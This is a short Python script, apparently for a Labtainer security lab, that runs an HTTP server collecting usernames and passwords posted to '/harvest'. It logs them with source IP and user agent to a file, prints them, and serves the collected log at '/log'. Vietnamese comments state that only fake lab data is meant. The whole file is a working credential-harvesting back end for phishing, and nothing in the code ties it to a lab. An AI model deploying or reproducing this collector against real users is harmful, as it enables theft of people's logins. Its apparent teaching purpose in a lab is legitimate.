#!/usr/bin/env python3
import os
import time
from pathlib import Path
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

HOST = "0.0.0.0"
PORT = 9090
LOG_FILE = os.path.expanduser("~/harvest_server.log")

def ts():
    return time.strftime("%Y-%m-%d %H:%M:%S")

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path != "/harvest":
            self.send_error(404)
            return

        length = int(self.headers.get("Content-Length", "0"))
        raw = self.rfile.read(length).decode("utf-8", errors="replace")
        form = parse_qs(raw)

        username = form.get("username", ["(trong)"])[0]
        password = form.get("password", ["(trong)"])[0]
        src_ip = self.client_address[0]
        ua = self.headers.get("User-Agent", "")
        now = ts()

        entry = f"[{now}] user={username} pass={password} ip={src_ip}"
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(entry + "\n")

        print("\n*** LAB EVENT: DEMO CREDENTIAL RECEIVED ***", flush=True)
        print("time      :", now, flush=True)
        print("source ip :", src_ip, flush=True)
        print("user-agent:", ua[:65], flush=True)
        print("username  :", username, flush=True)
        print("password  :", password, flush=True)
        print("NOTE: chi dung du lieu gia trong Labtainer.\n", flush=True)

        body = b"Thong tin demo da duoc ghi nhan."
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path != "/log":
            self.send_error(404)
            return
        try:
            data = Path(LOG_FILE).read_bytes()
        except Exception:
            data = b"Chua co ban ghi nao."
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, fmt, *args):
        return

if __name__ == "__main__":
    print(f"[harvest_server] Lang nghe tai port {PORT}...", flush=True)
    ThreadingHTTPServer((HOST, PORT), Handler).serve_forever()
